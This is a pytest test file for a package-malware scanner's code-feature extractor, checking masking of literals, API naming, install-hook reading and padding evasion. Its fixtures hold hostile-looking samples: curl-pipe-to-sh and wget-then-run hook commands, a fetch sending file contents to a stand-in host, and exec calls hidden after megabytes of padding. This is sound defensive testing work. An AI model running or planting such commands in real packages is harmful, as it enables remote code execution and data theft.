"""The code-reading features of the files a consumer runs (`CodeFeatures`), and when they are made."""

from __future__ import annotations

from types import SimpleNamespace

import pytest

from cordon_scanner.detect.base import FileUnit
from cordon_scanner.detect.code.features import CodeFeatures
from cordon_scanner.detect.code.reached_flows import ReachedFlows
from cordon_scanner.foundation.content import FileContent

# Distinctive literals: none of them may appear in any feature key, hashed or not.
MARKERS = ("zqxmarkerhost", "zqxmarkerkey", "zqxmarkermod", "zqxmarkercall")
JS = (
    "const cp = require('child_process');\n"
    "const fs = require('fs');\n"
    "const x = require('zqxmarkermod');\n"
    "// a comment with https://zqxmarkerhost.example/path\n"
    "const url = 'https://zqxmarkerhost.example/c';\n"
    "const key = 'zqxmarkerkey';\n"
    "const s = 'zqxmarkercall.exec(';\n"
    "fetch(url, { body: fs.readFileSync(key) });\n"
    "cp.exec(`echo ${key}`);\n"
    "const re = /'/g;\n"
)
PY = (
    "import os  # zqxmarkerhost\n"
    "import subprocess\n"
    "v = os.environ.get('zqxmarkerkey')\n"
    "subprocess.run(['curl', 'https://zqxmarkerhost.example'])\n"
)


class Fixture:
    @staticmethod
    def features(text: str, path: str = "index.js", place: str = "import") -> dict[str, float]:
        return CodeFeatures.of({place: [(path, text.encode())]})


class TestMasking:
    @pytest.mark.parametrize(("text", "path"), [(JS, "index.js"), (PY, "setup.py")])
    def test_no_string_value_appears_in_any_key(self, text: str, path: str) -> None:
        keys = " ".join(Fixture.features(text, path))
        assert not any(marker in keys for marker in MARKERS)

    def test_a_literal_is_its_shape(self) -> None:
        assert CodeFeatures.shape("https://a.example/x") == "URL"
        assert CodeFeatures.shape("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo" * 2) == "BASE64"
        assert CodeFeatures.shape("deadbeef" * 5) == "HEX"
        assert CodeFeatures.shape("hello") == "STRING"

    def test_a_string_spelling_a_call_is_not_a_call(self) -> None:
        keys = Fixture.features("const s = 'steal.exec(';\n")
        assert not any("_api_exec" in k for k in keys)


class TestCalls:
    def test_listed_modules_and_calls_are_named(self) -> None:
        keys = Fixture.features(JS)
        assert keys.get("code_import_api_mod_child_process") == 1.0
        assert keys.get("code_import_api_mod_fs") == 1.0
        assert keys.get("code_import_api_exec") == 1.0
        assert keys.get("code_import_api_readFileSync") == 1.0

    def test_an_unlisted_module_is_other_by_shape_never_by_name(self) -> None:
        keys = Fixture.features(JS)
        assert keys.get("code_import_api_mod_other") == 1.0

    def test_an_unlisted_member_call_is_hashed(self) -> None:
        keys = Fixture.features("thing.frobnicate();\n")
        assert any(k.startswith("code_import_apih_") for k in keys)
        assert not any("frobnicate" in k for k in keys)

    def test_the_n8n_credential_read_is_named(self) -> None:
        keys = Fixture.features("const c = await this.getCredentials('x');\n")
        assert "code_import_api_this.getCredentials" in keys


class TestShellAndTypeScript:
    HOOK = "package.json#postinstall.sh"

    def test_a_hook_command_is_words_with_every_address_masked(self) -> None:
        keys = Fixture.features(
            "curl -s https://zqxmarkerhost.example/zqxmarkerkey | sh", self.HOOK, "install"
        )
        assert any(k.startswith("code_install_tok_") for k in keys)
        assert not any(marker in " ".join(keys) for marker in MARKERS)

    def test_two_hosts_read_the_same(self) -> None:
        one = Fixture.features("wget http://a.example/x && node x.js", self.HOOK, "install")
        two = Fixture.features("wget http://b.example/y && node x.js", self.HOOK, "install")
        assert one == two

    def test_typescript_is_read_as_javascript(self) -> None:
        assert "code_import_api_exec" in Fixture.features("cp.exec(cmd as string);\n", "a.ts")


class TestBounds:
    def test_the_same_input_gives_the_same_features(self) -> None:
        assert Fixture.features(JS) == Fixture.features(JS)

    @pytest.mark.parametrize(
        ("text", "path"),
        [(JS * 8, "index.js"), (PY * 8, "setup.py"), ("curl -s x | sh\nnode a.js\n" * 8, "a.sh")],
    )
    def test_a_file_read_in_windows_gives_what_it_gives_whole(
        self, monkeypatch: pytest.MonkeyPatch, text: str, path: str
    ) -> None:
        whole = Fixture.features(text, path)
        monkeypatch.setattr(CodeFeatures, "WINDOW", 64)
        monkeypatch.setattr(CodeFeatures, "MARGIN", 24)
        assert Fixture.features(text, path) == whole

    def test_a_payload_past_megabytes_of_padding_is_read(self) -> None:
        padded = "/*" + " " * (3 << 20) + "*/\n" + "cp.exec(x);\n"
        assert "code_import_api_exec" in Fixture.features(padded)

    def test_a_payload_past_a_literal_longer_than_any_window_is_read(self) -> None:
        padded = "const blob = '" + "A" * (6 << 20) + "';\ncp.exec(blob);\n"
        assert "code_import_api_exec" in Fixture.features(padded)

    def test_counts_are_capped(self) -> None:
        keys = Fixture.features("a.exec();\n" * 50)
        assert keys["code_import_api_exec"] == CodeFeatures.COUNT_CAP

    def test_unfinished_python_keeps_what_was_read(self) -> None:
        keys = Fixture.features("import subprocess\ndef (:\n  '''\n", "x.py")
        assert any(k.startswith("code_import_tok_") for k in keys)

    def test_only_known_places_are_read(self) -> None:
        assert CodeFeatures.of({"other": [("index.js", JS.encode())]}) == {}


class TestWhenMade:
    @staticmethod
    def run() -> dict[str, float]:
        unit = FileUnit(content=FileContent.from_bytes("index.js", JS.encode()))
        ctx = SimpleNamespace(
            install_hook_paths=frozenset(),
            install_entry_paths=frozenset(),
            import_entry_paths=frozenset({"index.js"}),
            library_closure_paths=frozenset(),
        )
        return ReachedFlows.of([unit], ctx)  # type: ignore[arg-type]

    def test_a_users_scan_does_not_make_them(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ReachedFlows.MEASURE, raising=False)
        assert not any(k.startswith("code_") for k in TestWhenMade.run())

    def test_a_measurement_run_does(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ReachedFlows.MEASURE, "1")
        assert "code_import_api_exec" in TestWhenMade.run()


class TestSources:
    @staticmethod
    def ctx(install: frozenset[str] = frozenset(), entry: frozenset[str] = frozenset()) -> object:
        return SimpleNamespace(
            install_hook_paths=install,
            install_entry_paths=frozenset(),
            import_entry_paths=entry,
            library_closure_paths=frozenset(),
        )

    def test_an_install_hooks_command_line_is_install_code(self) -> None:
        manifest = b'{"name": "a", "version": "1.0.0", "scripts": {"postinstall": "node x.js"}}'
        unit = FileUnit(content=FileContent.from_bytes("package.json", manifest))
        got = ReachedFlows.sources([unit], TestSources.ctx(install=frozenset({"package.json"})))  # type: ignore[arg-type]
        assert got["install"] == [("package.json#postinstall.sh", b"node x.js")]

    @pytest.mark.parametrize(
        ("head", "read_as"),
        [
            (b"#!/usr/bin/env node\n", "bin/tool#.js"),
            (b"#!/usr/bin/python3\n", "bin/tool#.py"),
            (b"#!/bin/sh\n", "bin/tool#.sh"),
            (b"plain text\n", None),
        ],
    )
    def test_an_extensionless_bin_is_read_in_its_interpreters_language(
        self, head: bytes, read_as: str | None
    ) -> None:
        unit = FileUnit(content=FileContent.from_bytes("bin/tool", head + b"run()\n"))
        got = ReachedFlows.sources([unit], TestSources.ctx(entry=frozenset({"bin/tool"})))  # type: ignore[arg-type]
        assert [path for path, _ in got["import"]] == ([read_as] if read_as else [])

    def test_a_file_past_the_size_limit_is_read_whole(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ReachedFlows, "MAX_SIZE", 8)
        unit = FileUnit(content=FileContent.from_bytes("index.js", JS.encode()))
        got = ReachedFlows.sources([unit], TestSources.ctx(entry=frozenset({"index.js"})))  # type: ignore[arg-type]
        assert got["import"] == [("index.js", JS.encode())]
